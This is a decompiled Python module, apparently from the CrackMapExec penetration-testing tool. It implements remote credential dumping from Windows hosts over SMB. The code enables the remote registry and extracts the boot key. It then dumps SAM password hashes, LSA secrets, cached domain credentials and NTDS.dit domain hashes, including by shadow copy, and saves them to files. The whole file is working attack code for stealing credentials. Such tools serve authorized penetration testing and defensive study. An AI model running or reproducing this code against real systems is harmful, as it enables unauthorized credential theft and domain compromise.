# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /home/byt3bl33d3r/.virtualenvs/CME_old/lib/python2.7/site-packages/cme/credentials/secretsdump.py
# Compiled at: 2016-12-29 01:51:56
from impacket import winregistry
from binascii import unhexlify, hexlify
from gevent import sleep
from cme.remoteoperations import RemoteOperations
from cme.credentials.sam import SAMHashes
from cme.credentials.lsa import LSASecrets
from cme.credentials.ntds import NTDSHashes
from impacket.dcerpc.v5.rpcrt import DCERPCException
import traceback, os, logging

class DumpSecrets:

    def __init__(self, connection):
        self.__useVSSMethod = False
        self.__smbConnection = connection.conn
        self.__db = connection.db
        self.__host = connection.host
        self.__hostname = connection.hostname
        self.__remoteOps = None
        self.__SAMHashes = None
        self.__NTDSHashes = None
        self.__LSASecrets = None
        self.__bootKey = None
        self.__history = False
        self.__noLMHash = True
        self.__isRemote = True
        self.__outputFileName = os.path.join(os.path.expanduser('~/.cme'), ('logs/{}_{}').format(connection.hostname, connection.host))
        self.__doKerberos = False
        self.__justDC = False
        self.__justDCNTLM = False
        self.__pwdLastSet = False
        self.__resumeFileName = None
        self.__logger = connection.logger
        return

    def getBootKey(self):
        bootKey = ''
        tmpKey = ''
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = 'ControlSet%03d' % currentControlSet
        for key in ['JD', 'Skew1', 'GBG', 'Data']:
            logging.debug('Retrieving class info for %s' % key)
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + digit

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
        tmpKey = unhexlify(tmpKey)
        for i in xrange(len(tmpKey)):
            bootKey += tmpKey[transforms[i]]

        logging.info('Target system bootKey: 0x%s' % hexlify(bootKey))
        return bootKey

    def checkNoLMHashPolicy(self):
        logging.debug('Checking NoLMHash Policy')
        winreg = winregistry.Registry(self.__systemHive, self.__isRemote)
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = 'ControlSet%03d' % currentControlSet
        noLmHash = winreg.getValue('\\%s\\Control\\Lsa\\NoLmHash' % currentControlSet)
        if noLmHash is not None:
            noLmHash = noLmHash[1]
        else:
            noLmHash = 0
        if noLmHash != 1:
            logging.debug('LMHashes are being stored')
            return False
        else:
            logging.debug('LMHashes are NOT being stored')
            return True

    def enableRemoteRegistry(self):
        bootKey = None
        try:
            self.__remoteOps = RemoteOperations(self.__smbConnection, self.__doKerberos)
            self.__remoteOps.enableRegistry()
            self.__bootKey = self.__remoteOps.getBootKey()
            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
        except Exception as e:
            traceback.print_exc()
            logging.error('RemoteOperations failed: %s' % str(e))

        return

    def SAM_dump(self):
        self.enableRemoteRegistry()
        try:
            SAMFileName = self.__remoteOps.saveSAM()
            self.__SAMHashes = SAMHashes(SAMFileName, self.__bootKey, self.__logger, self.__db, self.__host, self.__hostname, isRemote=True)
            self.__SAMHashes.dump()
            self.__SAMHashes.export(self.__outputFileName)
        except Exception as e:
            traceback.print_exc()
            logging.error('SAM hashes extraction failed: %s' % str(e))

        self.cleanup()

    def LSA_dump(self):
        self.enableRemoteRegistry()
        try:
            SECURITYFileName = self.__remoteOps.saveSECURITY()
            self.__LSASecrets = LSASecrets(SECURITYFileName, self.__bootKey, self.__logger, self.__remoteOps, isRemote=self.__isRemote)
            self.__LSASecrets.dumpCachedHashes()
            self.__LSASecrets.exportCached(self.__outputFileName)
            self.__LSASecrets.dumpSecrets()
            self.__LSASecrets.exportSecrets(self.__outputFileName)
        except Exception as e:
            traceback.print_exc()
            logging.error('LSA hashes extraction failed: %s' % str(e))

        self.cleanup()

    def NTDS_dump(self, method, pwdLastSet, history):
        self.__pwdLastSet = pwdLastSet
        self.__history = history
        try:
            self.enableRemoteRegistry()
        except Exception:
            traceback.print_exc()

        if method == 'vss':
            self.__useVSSMethod = True
        if self.__useVSSMethod:
            NTDSFileName = self.__remoteOps.saveNTDS()
        else:
            NTDSFileName = None
        self.__NTDSHashes = NTDSHashes(NTDSFileName, self.__bootKey, self.__logger, isRemote=True, history=self.__history, noLMHash=self.__noLMHash, remoteOps=self.__remoteOps, useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM, pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName, outputFileName=self.__outputFileName)
        self.__NTDSHashes.dump()
        self.cleanup()
        return

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()
        if self.__SAMHashes:
            self.__SAMHashes.finish()
        if self.__LSASecrets:
            self.__LSASecrets.finish()
        if self.__NTDSHashes:
            self.__NTDSHashes.finish()